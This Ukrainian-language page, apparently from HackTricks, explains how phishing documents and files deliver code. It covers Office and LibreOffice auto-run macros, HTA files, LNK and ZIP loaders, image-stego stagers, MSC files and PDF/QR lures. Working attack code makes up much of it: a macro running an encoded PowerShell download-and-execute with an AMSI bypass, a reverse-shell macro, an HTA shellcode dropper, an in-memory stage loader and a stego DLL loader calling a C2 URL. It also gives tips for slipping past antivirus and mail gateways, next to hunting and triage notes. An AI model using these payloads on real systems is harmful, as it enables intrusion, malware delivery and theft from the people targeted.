# Фішингові файли та документи

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word виконує перевірку даних файлу перед його відкриттям. Перевірка даних полягає у визначенні структури даних відповідно до стандарту OfficeOpenXML. Якщо під час визначення структури даних виникає помилка, аналізований файл не буде відкрито.

Зазвичай файли Word, що містять макроси, мають розширення `.docm`. Однак можна перейменувати файл, змінивши його розширення, і водночас зберегти можливість виконання макросів.\
Наприклад, формат RTF за задумом не підтримує макроси, але файл DOCM, перейменований на RTF, оброблятиметься Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні механізми застосовуються до всіх програм пакета Microsoft Office (Excel, PowerPoint тощо).

За допомогою наведеної нижче команди можна перевірити, файли з якими розширеннями виконуватимуться в деяких програмах Office:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-файли, що посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), який містить макроси, також можуть «виконувати» макроси.

### Завантаження зовнішнього зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Категорії**: Links and References, **Назви полів**: includePicture, **Ім’я файлу або URL-адреса**:_ http://<ip>/whatever

![Документи Office — завантаження зовнішнього зображення: перейдіть до: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Щоб проаналізувати отриманий документ, а не створити його, див. [аналіз макросів VBA: сміттєвий код і UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Бекдор через макроси

За допомогою макросів можна виконувати довільний код із документа.

#### Функції автозавантаження

Що частіше вони трапляються, то ймовірніше, що AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду макросів

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Вручну видаліть метадані

Перейдіть до **File > Info > Inspect Document > Inspect Document** — відкриється інспектор документів. Натисніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Розширення документа

Після завершення виберіть спадне меню **Save as type** і змініть формат із **`.docx`** на Word 97–2003 **`.doc`**.\
Зробіть це, оскільки **не можна зберігати макроси у файлі `.docx`**, а розширення **`.docm`** із підтримкою макросів має **погану репутацію** (наприклад, на значку мініатюри є велика `!`, а деякі веб- і поштові шлюзи повністю блокують такі файли). Тому це **застаріле розширення `.doc` — найкращий компроміс**.

#### Генератори шкідливих макросів

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Макроси LibreOffice ODT з автозапуском (Basic)

Документи LibreOffice Writer можуть містити макроси Basic, які автоматично виконуються під час відкриття файла, якщо прив’язати макрос до події **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Простий макрос зворотного шелла має такий вигляд:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Зверніть увагу на подвійні лапки (`""`) усередині рядка — LibreOffice Basic використовує їх для екранування буквальних лапок, тому payload-и, що закінчуються на `...==""")`, зберігають збалансованість і внутрішньої команди, і аргументу Shell.

Поради щодо доставки:

- Збережіть файл як `.odt` і прив’яжіть макрос до події документа, щоб він спрацьовував одразу після відкриття.
- Надсилаючи лист за допомогою `swaks`, використовуйте `--attach @resume.odt` (`@` обов’язковий, щоб вкладенням були байти файлу, а не рядок із його назвою). Це критично під час зловживання SMTP-серверами, які приймають довільних одержувачів `RCPT TO` без перевірки.

## HTA Files

HTA — це програма Windows, яка **поєднує HTML і мови сценаріїв (наприклад, VBScript і JScript)**. Вона генерує інтерфейс користувача та виконується як застосунок із «повною довірою», без обмежень моделі безпеки браузера.

HTA виконується за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, тож `mshta` залежить від IE. Тому, якщо його видалити, HTA не зможуть виконуватися.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Підроблені картки вкладень в HTML-листах

HTML-лист може імітувати нативну картку попереднього перегляду вкладення поштового провайдера, не містячи справжнього вкладення. Talos виявила картку Gmail, відтворену з чотирьох вбудованих PNG-частин MIME, закодованих у Base64. Увесь візуальний елемент було обгорнуто одним anchor, а значення одержувача в `?m=<target-id>` давало змогу відстежувати кожного одержувача окремо. Посилання починалося з `//`, а не з `http://` чи `https://`; браузери розпізнають цей відносний до протоколу формат, але екстрактори URL, які знаходять лише повністю визначені URL, можуть його пропустити.<sup>[[11]](#references)</sup>

Під час аналізу перевіряйте вихідний MIME, а не покладайтеся на відображений список вкладень. Відтворіть, як вбудовані частини зображень формують візуальну картку, визначте anchor, що її обгортає, і нормалізуйте значення `href` із відносним до протоколу форматом перед витягуванням URL.<sup>[[11]](#references)</sup>

Щоб перевірити підміну відправника в конверті/заголовках і вирівнювання DMARC, див. [контрзаходи проти підміни відправника SMTP-листів](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Примусова NTLM-аутентифікація

Є кілька способів **віддалено примусити NTLM-аутентифікацію**. Наприклад, можна додати **невидимі зображення** до листів або HTML-сторінок, які відкриє користувач (навіть через HTTP MitM?). Або надіслати жертві **адресу файлів**, відкриття **папки** за якою **спричинить** **аутентифікацію**.

**Перевірте ці та інші ідеї на таких сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що можна не лише викрасти хеш або дані аутентифікації, а й **виконувати атаки NTLM relay**:

- [**Атаки NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay до сертифікатів)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK-завантажувачі + вбудовані в ZIP корисні навантаження (безфайловий ланцюжок)

У надзвичайно ефективних кампаніях розсилають ZIP-архів із двома легітимними документами-приманками (PDF/DOCX) і шкідливим .lnk-файлом. Суть у тому, що власне PowerShell-завантажувач зберігається в сирих байтах ZIP після унікального маркера, а .lnk вирізає його та запускає повністю в пам’яті.<sup>[[2]](#references)</sup>

Типовий сценарій, реалізований однорядковою командою PowerShell у .lnk:

1) Знайти вихідний ZIP у типових розташуваннях: Desktop, Downloads, Documents, %TEMP%, %ProgramData% і батьківській папці поточного робочого каталогу.
2) Прочитати байти ZIP і знайти жорстко заданий маркер (наприклад, xFIQCV). Усе після маркера є вбудованим PowerShell-корисним навантаженням.
3) Скопіювати ZIP до %ProgramData%, розпакувати його там і відкрити документ-приманку .docx, щоб усе виглядало легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний етап (наприклад, видалити всі символи #) і виконати його в пам’яті.

Приклад каркаса PowerShell для вирізання вбудованого етапу та його запуску:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Нотатки
- Для доставки часто зловживають піддоменами надійних PaaS (наприклад, *.herokuapp.com) і можуть фільтрувати payload (подавати нешкідливі ZIP-файли залежно від IP/UA).
- На наступному етапі часто розшифровують base64/XOR shellcode і виконують його через Reflection.Emit + VirtualAlloc, щоб мінімізувати сліди на диску.

Закріплення, використане в тому самому ланцюжку
- Перехоплення COM TypeLib для елемента керування Microsoft Web Browser, щоб IE/Explorer або будь-яка програма, яка його вбудовує, автоматично повторно запускала payload.<sup>[[2]](#references)[[4]](#references)</sup> Докладніше й готові до використання команди дивіться тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Пошук/IOC
- ZIP-файли, що містять рядок-маркер ASCII (наприклад, xFIQCV), дописаний до даних архіву.
- Файл .lnk, який перебирає батьківські/користувацькі папки, щоб знайти ZIP, і відкриває документ-приманку.
- Втручання в AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Тривалі ділові переписки, що завершуються посиланнями на надійних доменах PaaS.

## Поетапна доставка: спочатку приманка LNK → закріплення через заплановане завдання → довірене CPL side-loading

Ще один повторюваний шаблон — **файл `.lnk`, що видає себе за документ** і одразу відкриває нешкідливу приманку, поки у фоновому режимі розгортається справжній ланцюжок.<sup>[[3]](#references)</sup>

Спостережуваний процес:
1. Ярлик **маскується під PDF** і використовує `conhost.exe` або подібний proxy для запуску обфускованого завантажувача PowerShell.
2. PowerShell розбиває очевидні токени (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), тож наївні засоби виявлення, які шукають `iwr`, `gci`, `ren`, `cpi` або `schtasks`, не помічають команду.
3. Стейджер спочатку завантажує **документ-приманку**, відкриває його для жертви, а потім у фоновому режимі відновлює шкідливі файли.
4. Payload можуть записуватися з **нехарактерними розширеннями**, а потім перейменовуватися шляхом видалення символів-заповнювачів, що затримує появу очевидних артефактів `.exe` / `.cpl`.
5. Закріплення забезпечується **запланованим завданням із запуском щохвилини**, яке запускає довірений виконуваний файл-хост із доступного для запису користувачем шляху.

Мінімальні ознаки для пошуку за цим шаблоном:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Корисна схема розміщення файлів, на яку варто звернути увагу:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` або `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Чому другий етап важко виявити

У кейсі Rapid7 заплановане завдання неодноразово запускало **`Fondue.exe`** з `C:\Users\Public\`. Оскільки поруч із ним було розміщено **`APPWIZ.cpl`**, який експортував **`RunFODW`**, довірений бінарний файл Microsoft завантажував CPL зловмисника замість легітимної системної копії.

Потім CPL:
- Зчитує blob **AES-256-CBC** із `C:\Windows\Tasks\editor.dat`
- Розшифровує його за допомогою **Windows CNG / `bcrypt.dll`**
- Виділяє виконувану пам'ять і копіює до неї розшифрований shellcode
- Непрямо виконує його, передаючи вказівник на shellcode як callback для **`EnumUILanguagesW`**

Останній крок варто шукати окремо: malware часто уникає прямого переходу `((void(*)())buf)()` і натомість зловживає **легітимним WinAPI, що приймає callback**, щоб передати йому виконання.

Розшифрований payload у цій кампанії був shellcode **Donut**, який завантажував фінальний PE повністю в пам'ять і змінював **AMSI/WLDP/ETW** у поточному процесі перед передачею виконання. Докладніші нотатки про side-loading і постобробку в пам'яті дивіться тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичні напрямки пошуку:
- `.lnk`, що запускає `powershell.exe` або `conhost.exe`, а потім відкриває видимий документ-приманку.
- Короткочасні завантаження до **`C:\Users\Public\`**, за якими одразу відбувається перейменування файлів із безглуздими розширеннями.
- Заплановані завдання з непомітними назвами, наприклад `GoogleErrorReport`, що запускаються з **каталогів, доступних для запису користувачам**.
- Довірені бінарні файли, що завантажують **`.cpl` / `.dll`** з того самого нестандартного системного каталогу.
- Текстові blob-файли Base64, записані до **`C:\Windows\Tasks\`**, а потім зчитані side-loaded модулем.

## Payload-и, приховані в зображеннях між маркерами стеганографії (PowerShell stager)

Сучасні ланцюжки завантаження доставляють обфускований JavaScript/VBS, який декодує та запускає PowerShell stager у форматі Base64. Цей stager завантажує зображення (часто GIF), що містить приховану звичайним текстом між унікальними початковим і кінцевим маркерами DLL .NET у форматі Base64. Скрипт шукає ці роздільники (приклади, помічені в реальних атаках: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, декодує його з Base64 у байти, завантажує збірку в пам'ять і викликає відомий метод входу, передаючи URL C2.<sup>[[5]](#references)</sup>

Робочий процес
- Етап 1: архівований JS/VBS dropper → декодує вбудований Base64 → запускає PowerShell stager з параметрами -nop -w hidden -ep bypass.
- Етап 2: PowerShell stager → завантажує зображення, вирізає Base64 між маркерами, завантажує DLL .NET у пам'ять і викликає її метод (наприклад, VAI), передаючи URL C2 та параметри.
- Етап 3: loader отримує фінальний payload і зазвичай впроваджує його через process hollowing у довірений бінарний файл (найчастіше MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Докладніше про process hollowing і виконання через довірені утиліти як проксі дивіться тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Приклад PowerShell для вирізання DLL із зображення та виклику методу .NET у пам'яті:

<details>
<summary>Витягувач і завантажувач stego payload у PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Примітки
- Це ATT&CK T1027.003 (стеганографія/приховування маркерів).<sup>[[6]](#references)</sup> Маркери відрізняються між кампаніями.
- Обхід AMSI/ETW і деобфускацію рядків зазвичай виконують перед завантаженням збірки.
- Пошук: скануйте завантажені зображення на наявність відомих роздільників; виявляйте випадки, коли PowerShell звертається до зображень і відразу декодує блоки Base64.

Див. також інструменти stego та методи карвінгу:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → підготовка PowerShell через Base64

Поширений початковий етап — це невеликий, сильно обфускований файл `.js` або `.vbs`, доставлений в архіві. Його єдина мета — декодувати вбудований рядок Base64 і запустити PowerShell із параметрами `-nop -w hidden -ep bypass`, щоб завантажити наступний етап через HTTPS.<sup>[[5]](#references)</sup>

Схематична логіка (абстрактно):
- Прочитати вміст власного файлу
- Знайти блок Base64 між сторонніми рядками
- Декодувати його в PowerShell-код ASCII
- Виконати його за допомогою `wscript.exe`/`cscript.exe`, запустивши `powershell.exe`

Ознаки для пошуку
- Архівовані вкладення JS/VBS, які запускають `powershell.exe` із `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe` запускає `powershell.exe -nop -w hidden` із тимчасових каталогів користувача.

## Документи MSC як контейнери для виконання (GrimResource)

Файли Microsoft Management Console (`.msc`) — це визначення консолі у форматі XML, які зазвичай відкриваються за допомогою `mmc.exe`. **GrimResource** використовує посилання `StringTable` на ресурс `apds.dll`, що містить застарілий XSS-примітив. У результаті відкриття спеціально створеної консолі користувачем призводить до запуску JavaScript усередині `mmc.exe`. У виявлених зразках обфускація на основі `transformNode` поєднувалася з **DotNetToJScript**, щоб створити екземпляр корисного навантаження .NET без звичного шляху через макроси Office.<sup>[[9]](#references)</sup>

Під час статичного аналізу розглядайте недовірений MSC як текст і **не** відкривайте його подвійним клацанням:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Індикаторами з високою точністю під час виконання є завантаження `mmc.exe` CLR або скриптових компонентів, створення мережевих з’єднань або запуск `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` чи неочікуваного виконуваного файла. Формат легітимний, тому під час виявлення слід корелювати **джерело + підозрілий вміст XML/скрипту + поведінку `mmc.exe`**, а не блокувати всі MSC.<sup>[[9]](#references)</sup>

## PDF/QR-редиректори та керування видачею payload

Для використання PDF не потрібен exploit. У нещодавніх кампаніях у зовні нешкідливий документ вбудовують **QR-код або звичайне посилання**, перенаправляють браузерну сесію в обхід засобів захисту пошти та персоналізують адресу призначення, додаючи адресу одержувача. Microsoft задокументувала PDF-файли 2025 року з унікальними для кожного одержувача QR-URL, які вели до інфраструктури викрадення облікових даних RaccoonO365; у паралельному ланцюжку за допомогою фільтрації за IP-адресою та середовищем вибраним відвідувачам показували шлях до JavaScript/MSI, а сканерам або клієнтам, яким це не дозволено, — нешкідливий PDF.<sup>[[10]](#references)</sup>

Під час первинного аналізу перевіряйте і дії PDF, і відрендерені QR-коди. QR-код може бути намальований векторними засобами, а не збережений як зображення, яке можна видобути, тому перетворюйте кожну сторінку на растрове зображення та видобувайте вбудовані зображення:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Перевіряйте декодовані адреси призначення та перенаправлення з ізольованої системи аналізу, не проходячи автентифікацію. Корисні ознаки для пошуку: PDF-файли, що містять лише QR-код, майже порожні тіла листів, адреса отримувача, вбудована в параметр запиту, кілька перенаправлень через надійні хостингові платформи та різний вміст залежно від IP-адреси, геолокації, cookie, referrer або user agent. Порівнюйте запити з контрольованими профілями, оскільки єдиний запит із sandbox може отримати лише приманку.<sup>[[10]](#references)</sup>

## Файли Windows для викрадення NTLM-хешів

Перегляньте сторінку про **місця для викрадення NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – макрос LibreOffice → вебшел IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – кампанія ZipLine: складна фішингова атака на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – зловмисне ПЗ à la Mode: відстеження тактики Dropping Elephant у ланцюжку завантажувача на китайську тематику](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Перехоплення TypeLib – нова техніка закріплення через COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – завантажувач PhantomVAI поширює різноманітні infostealer-и](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – стеганографія (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – підміна процесу (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – виконання через довірені утиліти розробника: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console для первинного доступу та ухилення від виявлення](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – зловмисники використовують податковий сезон для розгортання фішингових кампаній на податкову тематику](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – ланцюжок доставки UAT-11587 та бекдор Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
